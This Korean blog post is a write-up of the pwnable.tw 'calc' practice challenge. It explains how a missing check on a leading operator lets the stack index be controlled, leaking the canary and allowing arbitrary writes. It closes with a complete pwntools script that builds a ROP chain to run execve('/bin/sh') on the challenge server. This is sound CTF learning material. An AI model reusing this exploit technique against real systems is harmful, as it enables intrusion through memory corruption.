---
layout: post
title: ! ' [pwnable.tw] calc writeup '
excerpt_separator: <!--more-->
tags:
  - KRater
  - Write-up
  - pwnable.tw
  - pwnable
---

pwnable.tw 문제 풀었습니다. 150점 짜리면 세번째로 쉬운건데 너무 오래걸렸네요... 갈 길이 멉니다..

<!--more-->

## calc (150 pts)

[pwnable.tw](https://pwnable.tw/) 문제입니다. 여긴 난이도가 꽤 있는거 같아요.. 확실히 100pts 문제에 비해 푼 사람이 절반이라는 게 놀랍군요.

![]({{ site.baseurl }}/images/KRater/2018-10-02-pwnable-tw-calc/pic01.PNG)

문제 자체는 상당히 심플한 프로그램입니다. 계산기에요. 근데 프로그램 코드가 좀 긴 편입니다. 분석하기 싫게 만들었어요. main 함수 안으로 들어가보면 알람 60초 걸어놓고 calc 함수를 호출하는 데, 이게 가장 중요한 함수입니다. 들어가서 의사코드로 확인해볼게요.

![]({{ site.baseurl }}/images/KRater/2018-10-02-pwnable-tw-calc/pic02.PNG)

무한루프로 1분동안 계속 실행되고, get_expr, parse_expr 함수가 눈에 띕니다. get_expr 함수는 입력받아서 화이트리스트를 통해 올바르지 않은 입력값은 아예 받아들이지 않습니다. 반면에 걸러진 표현식은 expr 변수에 저장됩니다. 이 함수는 표현식이 올바른지는 검사하지 않습니다. 단지 화이트리스트 내의 원소에 포함인지만 검사해요.

![]({{ site.baseurl }}/images/KRater/2018-10-02-pwnable-tw-calc/pic04.PNG)

parse_expr는 걸러진 표현식을 이용해 계산을 수행합니다. 내부적으로 eval 이라는 함수를 이용해서 계산하는데, 계산하는 방식이 조금 특이합니다. 16 + 4 라는 표현식을 계산한다고 가정 해 봅시다. 먼저 1과 6을 넘긴 뒤 '+'에 도달하면 표현식을 분해하기 시작합니다. 16은 2bytes를 차지하므로 null 까지 3bytes를 동적 할당한 뒤, 이를 atoi 함수를 이용해서 int형으로 바꾸어주는 작업을 합니다. 바뀐 숫자는 poll 배열에 들어갑니다. 그 뒤 기호 배열(s)이 현재 비어있으므로, '+' 기호를 기호 배열에 넣습니다. 다음 숫자 4를 넘기고 expr 분석을 종료하면 기호 배열에서 연산 기호를 빼내면서 차례대로 연산합니다. 만약 *, /가 등장하면 이는 스택처럼 작동하여 적절하게 우선순위 연산을 수행합니다.

parse_expr이 에러를 감지하는 경우는 크게 두가지입니다. 첫 번째로는 연산 기호 이후에 숫자가 오지 않았을 경우입니다. 두 번째로는 숫자에 '0'이 나오는 경우입니다. 이 두 가지의 경우는 계산을 강제로 종료하고, 나머지는 정해진 대로 연산을 수행합니다. 그런데 문제는 맨 처음에 숫자 대신 연산 기호가 나타나는 경우를 제어하고 있지 않아서 발생합니다.

![]({{ site.baseurl }}/images/KRater/2018-10-02-pwnable-tw-calc/pic03.PNG)

현재 계산을 수행하는 과정은 가장 처음 표현식이 숫자라고 가정하면서 출발합니다. 만약 숫자, 연산기호, 숫자의 형식이 아니라 연산기호, 숫자의 형식으로 값이 들어와도 정상이라고 생각하죠.

![]({{ site.baseurl }}/images/KRater/2018-10-02-pwnable-tw-calc/pic06.PNG)

보기 쉽게 바꿔주면 이렇습니다. IDA에서 구조체 선언은 처음 해봤는데 보기 편하네요. 

![]({{ site.baseurl }}/images/KRater/2018-10-02-pwnable-tw-calc/pic05.PNG)

eval에서 연산할 때 p->numbers의 배열을 참조하는데, 이때 cnt의 값에 따라서 참조하는 배열 위치가 다릅니다. 그런데 이부분을 init_pool에서 100개까지만 정리하므로 그 밖의 값들은 정리가 안될거에요. 그럼 이런 상황에서 만약에 '' + 100과 같은 값을 입력했다고 가정해봅시다. 일단 ''이 atoi('')에서 0을 반환하는 데, 0의 경우에는 numbers에 접근하지 않습니다. 근데 numbers에 접근하지 않으면 cnt도 증가시키지 않아요. 그리고 '+' 연산 기호가 스택에 들어가고, 100이 numbers에 접근하면서 cnt가 1이 됩니다.

![]({{ site.baseurl }}/images/KRater/2018-10-02-pwnable-tw-calc/pic07.PNG)

지금 cnt가 1이죠. 그런데 eval 함수에서 더하기 연산을 하면서 `p->numbers[-1] = p->numbers[-1] + p->numbers[0]`이 됩니다. p->numbers[-1]은 p->cnt입니다. 그러면 p->cnt가 1이었다가 입력해준 숫자랑 더해지면서 101이 될겁니다. eval에서 마지막에 --p->cnt를 해주면서 다시 입력해 준 숫자가 됩니다. 결국 p->cnt가 매우 커졌을뿐만 아니라, 우리가 원하는 값으로 제어됩니다. 그럼 출력하는 부분을 볼까요?

![]({{ site.baseurl }}/images/KRater/2018-10-02-pwnable-tw-calc/pic08.PNG)

p->numbers[p->cnt - 1]입니다. 그러면 p->cnt가 우리가 입력한 값이니까 `입력한 값-1` 의 위치에 있는 정수를 출력할 수 있게됩니다. p->numbers의 0번째부터 canary까지는 `356(*4) bytes` 만큼 떨어져있으니, 입력할 값을 357로 해주면 canary가 출력됩니다.

![]({{ site.baseurl }}/images/KRater/2018-10-02-pwnable-tw-calc/pic09.PNG)

또한 임의 메모리에 값을 덮어쓸 수도 있게되었습니다. 임의 메모리 오프셋으로 p->cnt 값을 조정해주고 거기다가 값을 더하거나 빼면 eval함수에서 해당 메모리의 값이 조작되니까요. 이를 기반으로 익스플로잇 코드를 작성했습니다.

```python
from pwn import *

PROCESS = "./calc"
HOST = "chall.pwnable.tw"
PORT = 10100
#r = process(PROCESS)
r = remote(HOST, PORT)

addr_bin_sh = 0x080ee360
_bin = 0x6e69622f
__sh = 0x0068732f

pop_eax = 0x0805c34b # pop eax; ret
pop_ecx_ebx = 0x080701d1 # pop ecx; pop ebx; ret
pop_edx = 0x080701aa # pop edx; ret
write_ecx = 0x080958c2 # add [ecx], eax; ret
int80 = 0x08070880 # int 0x80; ret

def main () :
	r.recvuntil("==\n")
	insert(361, pop_eax)
	insert(362, _bin)
	insert(363, pop_ecx_ebx)
	insert(364, addr_bin_sh)
	insert(365, addr_bin_sh)
	insert(366, write_ecx)
	insert(367, pop_eax)
	insert(368, __sh)
	insert(369, pop_ecx_ebx)
	insert(370, addr_bin_sh+4)
	insert(371, addr_bin_sh+4)
	insert(372, write_ecx)
	insert(373, pop_eax)
	insert(374, 0xb)
	insert(375, pop_ecx_ebx)
	insert(376, addr_bin_sh+8)
	insert(377, addr_bin_sh)
	insert(378, pop_edx)
	insert(379, addr_bin_sh+8)
	insert(380, int80)
	r.sendline("")

	# get shell
	r.interactive()

def insert (index, data) :
	show = "+" + str(index)
	r.sendline(show)
	origin = int(r.recvline())
	if (origin < 0) :
		origin *= -1

	payload = show
	payload += "+" + str(int(data))
	payload += "-" + str(origin)
	r.sendline(payload)
	print (payload)
	r.recv(1024)

if __name__ == '__main__' :
	main ()
```

.BSS 영역에 /bin/sh를 써주고 실행시키는 쉘 코드를 연산을 통해 작성했습니다. 쓰고보니 쓴 값에 따라서 꼬랑지가 결정되므로 좀더 이쁘게 쓸 수 있더라구요.. 그래도 뭐 작동하니까요 ㅎ..

![]({{ site.baseurl }}/images/KRater/2018-10-02-pwnable-tw-calc/pic10.PNG)

읽어주셔서 감사합니다 :)